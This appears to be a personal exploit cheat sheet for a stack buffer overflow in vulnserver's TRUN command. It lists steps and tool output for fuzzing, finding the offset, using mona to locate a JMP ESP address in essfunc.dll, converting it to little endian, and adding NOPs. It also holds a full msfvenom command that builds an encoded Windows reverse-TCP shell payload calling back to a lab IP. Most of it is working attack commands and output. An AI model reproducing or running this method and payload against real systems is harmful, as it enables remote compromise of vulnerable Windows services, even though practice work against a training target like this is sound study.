FAST
01 	FUZZ
02 	PATTERN
03 	OFSET
04 	!mona modules
05 	find jmp esp address 	
05 	press icon `e' in menubar select dll bij doubleclick and search for jmp esp 
06 	ruby /usr/share/metasploit-framework/nasm_shell.rb   			jmp esp   	FFE4
07 	!mona find -s "\xff\xe4" -m essfunc.dll
08 	625011AF  convert to little endian \xAF\x11\x50\x62
09 	Finding bad chars Send all chars rightclick address in esp --> folow in dump
10 	msfvenom -p windows/shell_reverse_tcp LHOST=172.16.121.140 LPORT=4444 --platform windows -a x86 -b '\x00\x0A'  -f c --smallest -e x86/shikata_ga_nai EXITFUNC=thread 

11 	add nops \x90 before shellcode



vulnserver

nc 172.16.121.139 9999

STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]

using TRUN command breacks @ 5000 Bytes

ruby bofk-cli.rb -c 5000 -t python > pattern-trun.txt

stack overflow @ 396f4338

ruby bofk-cli.rb -o 396f4338


---[ Pattern offset ]------------------------------------------------------------------------------------------------
[+] Actual pattern length: 20280 chars.
[+] Matches: 1 times.

2006



TESTEIP matche 42424242 = B = correct


JMP address search

!mona modules


Log data, item 11
 Address=0BADF00D
 Message= 0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\pwn\Desktop\vulnserver\vulnserver.exe)


and
Log data, item 53
 Address=0BADF00D
 Message= 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)



press icon `e' in menubar



ruby /usr/share/metasploit-framework/nasm_shell.rb
jmp esp
FFE4


!mona find -s "\xff\xe4" -m vulnserver.exe


!mona find -s "\xff\xe4" -m essfunc.dll



0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Module info :
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D    0x75c60000 | 0x75c6a000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\system32\LPK.dll)
0BADF00D    0x75d10000 | 0x75d16000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
0BADF00D    0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
0BADF00D    0x75ef0000 | 0x75fbc000 | 0x000cc000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
0BADF00D    0x75be0000 | 0x75c2a000 | 0x0004a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
0BADF00D    0x753a0000 | 0x753dc000 | 0x0003c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [mswsock.dll] (C:\Windows\system32\mswsock.dll)
0BADF00D    0x763c0000 | 0x7645d000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.17514 [USP10.dll] (C:\Windows\system32\USP10.dll)
0BADF00D    0x76370000 | 0x763be000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
0BADF00D    0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False |  False   | False  | -1.0- [vulnserver.exe] (C:\Users\pwn\Desktop\vulnserver\vulnserver.exe)
0BADF00D    0x766b0000 | 0x76784000 | 0x000d4000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
0BADF00D    0x76600000 | 0x766ac000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
0BADF00D    0x76990000 | 0x76a59000 | 0x000c9000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [user32.dll] (C:\Windows\system32\user32.dll)
0BADF00D    0x77810000 | 0x7794c000 | 0x0013c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
0BADF00D    0x762c0000 | 0x76361000 | 0x000a1000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
0BADF00D    0x77970000 | 0x779a5000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.DLL] (C:\Windows\system32\WS2_32.DLL)
0BADF00D    0x74da0000 | 0x74da5000 | 0x00005000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [wshtcpip.dll] (C:\Windows\System32\wshtcpip.dll)
0BADF00D    0x75e20000 | 0x75e3f000 | 0x0001f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
0BADF00D   -----------------------------------------------------------------------------------------------------------------------------------------
0BADF00D
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.234000
0BADF00D   [+] Command used:
0BADF00D   !mona find -s "\xff\xe4" -m essfunc.dll

           ---------- Mona command started on 2017-11-11 15:11:11 (v2.0, rev 577) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : *
0BADF00D       - Only querying modules essfunc.dll
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D       - Treating search pattern as bin
0BADF00D   [+] Searching from 0x62500000 to 0x62508000
0BADF00D   [+] Preparing output file 'find.txt'
0BADF00D       - (Re)setting logfile find.txt
0BADF00D   [+] Writing results to find.txt
0BADF00D       - Number of pointers of type '"\xff\xe4"' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
625011BB     0x625011bb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
625011C7     0x625011c7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
625011D3     0x625011d3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
625011DF     0x625011df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
625011EB     0x625011eb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
625011F7     0x625011f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
62501203     0x62501203 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
62501205     0x62501205 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\pwn\Desktop\vulnserver\essfunc.dll)
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.281000






625011AF  convert to little endian

\xAF\x11\x50\x62




msfvenom -p windows/shell_reverse_tcp LHOST=172.16.121.1 LPORT=4444 --platform windows -a x86 -b '\x00\x0A'  -f c --smallest -e x86/shikata_ga_nai EXITFUNC=thread 



Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes


625011AF   FFE4             JMP ESP


ruby bofk-cli.rb  -e \x625011AF                1 ↵  6707  17:37:10
---[ Little endian format ]------------------------------------------------------------------------------------------
\xAF\x11\x50\x62
---------------------------------------------------------------------------------------------------------------------




